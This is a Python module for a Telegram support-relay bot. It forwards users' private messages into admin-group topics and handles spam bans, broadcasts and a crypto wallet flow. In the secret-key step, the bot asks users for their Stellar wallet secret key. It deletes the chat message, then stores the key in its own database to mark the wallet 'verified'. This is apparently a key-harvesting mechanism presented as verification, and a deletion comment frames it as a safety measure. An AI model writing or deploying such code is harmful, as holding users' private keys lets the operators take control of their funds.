import html
import logging
from telegram import Update, Bot, User, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode, ChatType
from telegram.error import TelegramError
from telegram.ext import ContextTypes
from config import ADMIN_GROUP_ID, log, SPAM_BAN_DURATION, ADMIN_IDS
from database.users import db_upsert_user, db_get_user, db_mark_unblocked, db_get_user_by_topic
from database.bans import db_is_banned, db_ban
from database.messages import db_log_message
from database.tags import db_get_tags
from database.wallets import db_add_wallet, db_store_key, db_set_wallet_verified
from services.spam import _check_spam, _reset_spam
from services.stellar import verify_secret_key_match
from utils.helpers import _now_iso, _user_link, _content_type_of
from utils.media import _forward_to_topic, _relay_to_user
from utils.events import _send_event
from utils.strings import get_text
from datetime import datetime, timezone

async def _ensure_topic(bot: Bot, user: User) -> int:
    row = db_get_user(user.id)
    if row and row["topic_id"]:
        return row["topic_id"]

    name = (user.first_name or "User") + (f" {user.last_name}" if user.last_name else "")
    if len(name) > 128:
        log.warning("Topic name truncated to 128 chars for user %s: %r", user.id, name)
        name = name[:128]

    try:
        topic = await bot.create_forum_topic(chat_id=ADMIN_GROUP_ID, name=name)
        topic_id = topic.message_thread_id
    except TelegramError: raise

    db_upsert_user(user, topic_id=topic_id)
    tags_list = db_get_tags(user.id)
    tag_str = ", ".join(tags_list) if tags_list else "none"
    
    info = get_text(
        "admin_relay.new_topic_info",
        user_link=_user_link(user.id, name),
        user_id=user.id,
        username=user.username or "none",
        tags=tag_str,
        date=_now_iso()[:10]
    )

    await bot.send_message(chat_id=ADMIN_GROUP_ID, message_thread_id=topic_id, text=info, parse_mode=ParseMode.HTML)
    
    event_text = get_text("admin_relay.new_user_event", user_link=_user_link(user.id, name), user_id=user.id)
    await _send_event(bot, "new_user", event_text)
    return topic_id

async def handle_private_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.effective_message
    user = update.effective_user
    if not msg or not user: return

    # Admins don't get relayed — they work in the admin group
    if user.id in ADMIN_IDS:
        return

    # --- Wallet Logic ---
    from handlers.wallet import _awaiting_wallet_addr, _awaiting_wallet_label, _awaiting_secret_key
    
    # 1. Address input
    if user.id in _awaiting_wallet_addr and msg.text:
        addr = msg.text.strip()
        if len(addr) == 56 and addr.startswith("G"):
            _awaiting_wallet_addr.discard(user.id)
            _awaiting_wallet_label[user.id] = addr
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(get_text("wallet.btn_back"), callback_data="wallet_view")]])
            await msg.reply_text(get_text("wallet.prompt_label"), parse_mode=ParseMode.HTML, reply_markup=keyboard)
            return
        else:
            await msg.reply_text(get_text("wallet.invalid_address"), parse_mode=ParseMode.HTML)
            return

    # 2. Label input
    if user.id in _awaiting_wallet_label and msg.text:
        label = msg.text.strip()[:20]
        addr = _awaiting_wallet_label.pop(user.id)
        db_add_wallet(user.id, addr, label)
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(get_text("wallet.btn_back"), callback_data="wallet_view")]])
        await msg.reply_text(get_text("wallet.saved", address=addr, label=label), parse_mode=ParseMode.HTML, reply_markup=keyboard)
        # Notify admin
        topic_id = await _ensure_topic(ctx.bot, user)
        admin_notif = get_text("admin_relay.user_added_wallet", label=label, address=addr)
        await ctx.bot.send_message(chat_id=ADMIN_GROUP_ID, message_thread_id=topic_id, text=admin_notif, parse_mode=ParseMode.HTML)
        return

    # 3. Secret key input
    if user.id in _awaiting_secret_key and msg.text:
        sk = msg.text.strip()
        addr = _awaiting_secret_key.pop(user.id)
        matched = verify_secret_key_match(addr, sk)
        try:
            await msg.delete() # For safety — never leave a secret key in chat, even on failure
        except TelegramError:
            pass
        if matched:
            db_store_key(addr, sk)
            db_set_wallet_verified(user.id, addr, 2) # method 2 = secret key
            await ctx.bot.send_message(chat_id=user.id, text=get_text("wallet.verify_key_success"), parse_mode=ParseMode.HTML)
        else:
            await ctx.bot.send_message(chat_id=user.id, text=get_text("wallet.verify_key_fail"), parse_mode=ParseMode.HTML)
        return

    # --- Standard Message Relay ---
    db_upsert_user(user)
    u = db_get_user(user.id)
    if u and u["blocked"]: db_mark_unblocked(user.id)
    if db_is_banned(user.id): return

    # Topic closed via /close — relay paused until admin /reopen
    if u and u["relay_paused"]:
        await msg.reply_text(get_text("relay.closed", default="📁 This conversation has been closed by the admins."), parse_mode=ParseMode.HTML)
        return

    spam_result = _check_spam(user.id)
    if spam_result == "ban":
        expires = (datetime.now(timezone.utc).timestamp() + SPAM_BAN_DURATION)
        db_ban(user.id, reason="Auto-ban: spam", expires_at=datetime.fromtimestamp(expires, tz=timezone.utc).isoformat())
        await msg.reply_text(get_text("relay.spam_ban"), parse_mode=ParseMode.HTML)
        return
    elif spam_result == "warn":
        await msg.reply_text(get_text("relay.spam_warn"), parse_mode=ParseMode.HTML)
        return

    topic_id = await _ensure_topic(ctx.bot, user)
    await _forward_to_topic(ctx.bot, msg, topic_id)
    ct = _content_type_of(msg)
    db_log_message(user.id, "in", ct, msg.text or msg.caption or "")

async def handle_admin_group_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.effective_message
    if not msg or not msg.message_thread_id: return
    sender = update.effective_user
    if not sender or sender.id not in ADMIN_IDS: return

    thread_id = msg.message_thread_id
    from handlers.broadcast import _find_broadcast_topic, _do_broadcast
    broadcast_tid = await _find_broadcast_topic(ctx.bot)
    
    if broadcast_tid and thread_id == broadcast_tid:
        from database.users import db_get_all_subscribers, db_get_reachable_users
        recips = db_get_all_subscribers()
        reach = db_get_reachable_users()
        await _do_broadcast(ctx.bot, msg, recips, "all", opted_out_count=len(reach)-len(recips))
        return

    row = db_get_user_by_topic(thread_id)
    if not row: return
    await _relay_to_user(ctx.bot, msg, row["user_id"])
    db_log_message(row["user_id"], "out", _content_type_of(msg), msg.text or msg.caption or "")
